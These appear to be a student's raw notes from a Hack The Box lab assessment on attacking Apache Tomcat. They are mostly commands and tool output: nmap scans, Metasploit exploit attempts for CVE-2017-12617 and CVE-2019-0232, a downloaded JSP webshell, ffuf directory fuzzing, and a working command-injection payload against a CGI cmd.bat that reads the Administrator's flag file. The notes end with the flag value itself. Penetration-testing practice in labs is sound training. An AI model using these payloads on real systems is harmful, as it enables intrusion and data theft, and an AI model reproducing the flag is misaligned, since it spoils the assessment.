# Attacking Common Applications - Skills Assessment I

sudo nmap --open -sV 10.129.201.89

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-16 00:30 GMT
Nmap scan report for 10.129.201.89
Host is up (0.040s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8000/tcp open  http          Jetty 9.4.42.v20210604
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.07 seconds

http://10.129.201.89:8080/

version : 9.0.0.M1

CVE-2017-12617


sudo msfconsole -q
[msf](Jobs:0 Agents:0) >> search tomcat_jsp_upload_bypass

   0  exploit/multi/http/tomcat_jsp_upload_bypass  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass

use 0
set LHOST 10.10.15.193
set RHOSTS 10.129.201.89
run

[*] Started reverse TCP handler on 10.10.14.88:4444 
[*] Uploading payload...
[-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
[*] Exploit completed, but no session was created.

set payload java/jsp_shell_bind_tcp
run

[*] Uploading payload...
[-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
[*] Exploit completed, but no session was created.

check
[*] 10.129.201.89:8080 - The target is not exploitable.

CVE-2019-0232

[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_jsp_upload_bypass) >> search CVE-2019-0232

   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability

use 0
set LHOST 10.10.15.193
set RHOSTS 10.129.201.89
check
[*] 10.129.201.89:8080 - The target is not exploitable.

run

[*] Started reverse TCP handler on 10.10.14.88:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.

set ForceExploit true
run

[*] Started reverse TCP handler on 10.10.14.88:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress - 100.02% done (100692/100668 bytes)
[*] Exploit completed, but no session was created.

gobuster dir -u http://10.129.201.89:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

/docs                 (Status: 302) [Size: 0] [--> http://10.129.201.89:8080/docs/]
Progress: 765 / 87665 (0.87%)                                                   
/examples             (Status: 302) [Size: 0] [--> http://10.129.201.89:8080/examples/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 0]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 0]                                          
/http%3A%2F%2Fblogs   (Status: 400) [Size: 0]                                          
/http%3A%2F%2Fblog    (Status: 400) [Size: 0] 
/**http%3A%2F%2Fwww   (Status: 400) [Size: 0]  

use auxiliary/scanner/http/tomcat_mgr_login 
set STOP_ON_SUCCESS true
set RHOSTS 10.129.201.89
run

[-] http://10.129.201.89:8080/manager/html - Authorization not requested
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

# Upload malicious war archive

wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

use multi/http/tomcat_mgr_upload
set RHOSTS 10.129.201.89
set LHOST 10.10.15.193
set RPORT 8080
check
[*] 10.129.201.89:8080 - Cannot reliably check exploitability.


[*] Started reverse TCP handler on 10.10.15.193:4444 
[*] Retrieving session ID and CSRF token...
[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
[*] Exploit completed, but no session was created.


ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://10.129.201.89:8080/indexFUZZ > fuzz_extension.txt

cat fuzz_extension.txt 
.jsp                    [Status: 200, Size: 11436, Words: 4258, Lines: 203, Duration: 297ms]

http://10.129.201.89:8080/index.jsp

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.201.89:8080/FUZZ.jsp -v > fuzz_page.txt
 
cat fuzz_page.txt | grep "Status: 200"


ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.201.89:8080/FUZZ -recursion -recursion-depth 1 -e .jsp -v > fuzz_recursive.txt


[2K[Status: 200, Size: 11436, Words: 4258, Lines: 203, Duration: 14ms][0m
[2K| URL | http://10.129.201.89:8080/index.jsp
[2K    * FUZZ: index.jsp

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 8ms][0m
[2K| URL | http://10.129.201.89:8080/docs
[2K| --> | http://10.129.201.89:8080/docs/
[2K    * FUZZ: docs

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7ms][0m
[2K| URL | http://10.129.201.89:8080/examples
[2K| --> | http://10.129.201.89:8080/examples/
[2K    * FUZZ: examples

[2K[Status: 200, Size: 11436, Words: 4258, Lines: 203, Duration: 14ms][0m
[2K| URL | http://10.129.201.89:8080/
[2K    * FUZZ: 

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 16ms][0m
[2K| URL | http://10.129.201.89:8080/docs/images
[2K| --> | http://10.129.201.89:8080/docs/images/
[2K    * FUZZ: images

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 9ms][0m
[2K| URL | http://10.129.201.89:8080/docs/api
[2K| --> | http://10.129.201.89:8080/docs/api/
[2K    * FUZZ: api

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 10ms][0m
[2K| URL | http://10.129.201.89:8080/docs/architecture
[2K| --> | http://10.129.201.89:8080/docs/architecture/
[2K    * FUZZ: architecture

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 11ms][0m
[2K| URL | http://10.129.201.89:8080/docs/config
[2K| --> | http://10.129.201.89:8080/docs/config/
[2K    * FUZZ: config

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 16ms][0m
[2K| URL | http://10.129.201.89:8080/docs/appdev
[2K| --> | http://10.129.201.89:8080/docs/appdev/
[2K    * FUZZ: appdev

[2K[Status: 200, Size: 16839, Words: 1942, Lines: 227, Duration: 8ms][0m
[2K| URL | http://10.129.201.89:8080/docs/
[2K    * FUZZ: 

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 34ms][0m
[2K| URL | http://10.129.201.89:8080/examples/jsp
[2K| --> | http://10.129.201.89:8080/examples/jsp/
[2K    * FUZZ: jsp

[2K[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 8ms][0m
[2K| URL | http://10.129.201.89:8080/examples/servlets
[2K| --> | http://10.129.201.89:8080/examples/servlets/
[2K    * FUZZ: servlets

[2K[Status: 200, Size: 1156, Words: 144, Lines: 31, Duration: 10ms][0m
[2K| URL | http://10.129.201.89:8080/examples/
[2K    * FUZZ: 



ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/ > fuzz-subdomain.txt

ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:52583/ -H 'Host: FUZZ.academy.htb' -fs 900 > ffuf-vhost.txt

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.201.89:8080/docs/FUZZ.jsp -v > fuzz_page.txt





ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.201.89:8080/FUZZ

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.201.89:8080/FUZZ > fuzz.txt

cat fuzz.txt | grep "Status: 301"

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.201.89:8080/FUZZ -recursion -recursion-depth 1 -e .php -v > fuzz.txt

cat fuzz.txt | grep "Status"

ffuf -u http://10.129.201.89:8080/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
ffuf -u http://10.129.201.89:8080/host-manager/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt > ffuf_host-manager.txt
ffuf -u http://10.129.201.89:8080/manager/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt > ffuf_manager.txt

### CGI

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.cmd > fuzz_cgi.txt
cat fuzz_cgi.txt

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat > fuzz_cgi_bat.txt
cat fuzz_cgi_bat.txt
cmd                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 68ms]

http://10.129.201.89:8080/cgi/cmd.bat?&dir

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi

09/29/2021  08:26 AM    <DIR>          .
09/29/2021  08:26 AM    <DIR>          ..
09/01/2021  06:58 AM    <DIR>          %SystemDrive%
09/29/2021  08:26 AM            73,802 bHPVV.exe
08/31/2021  12:55 PM                48 cmd.bat
               2 File(s)         73,850 bytes
               3 Dir(s)  28,271,505,408 bytes free

http://10.129.201.89:8080/cgi/cmd.bat?&c%3A%5Cwindows%5Csystem32%5Ctype.exe

http://10.129.201.89:8080/cgi/cmd.bat?&type%20c%3A%5CUsers%5CAdministrator%5CDesktop%5Cflag.txt

--> Failed


http://10.129.201.89:8080/cgi/cmd.bat?&dir&+whoami

http://10.129.201.89:8080/cgi/cmd.bat?&dir&+type+cmd.bat

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi

09/29/2021  08:26 AM    <DIR>          .
09/29/2021  08:26 AM    <DIR>          ..
09/01/2021  06:58 AM    <DIR>          %SystemDrive%
09/29/2021  08:26 AM            73,802 bHPVV.exe
08/31/2021  12:55 PM                48 cmd.bat
               2 File(s)         73,850 bytes
               3 Dir(s)  28,369,334,272 bytes free
@echo off
echo Content-Type: text/plain
echo .

http://10.129.201.89:8080/cgi/cmd.bat?&dir&+type+c%3A%5CUsers%5CAdministrator%5CDesktop%5Cflag.txt

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi

09/29/2021  08:26 AM    <DIR>          .
09/29/2021  08:26 AM    <DIR>          ..
09/01/2021  06:58 AM    <DIR>          %SystemDrive%
09/29/2021  08:26 AM            73,802 bHPVV.exe
08/31/2021  12:55 PM                48 cmd.bat
               2 File(s)         73,850 bytes
               3 Dir(s)  28,369,334,272 bytes free
f55763d31a8f63ec935abd07aee5d3d0

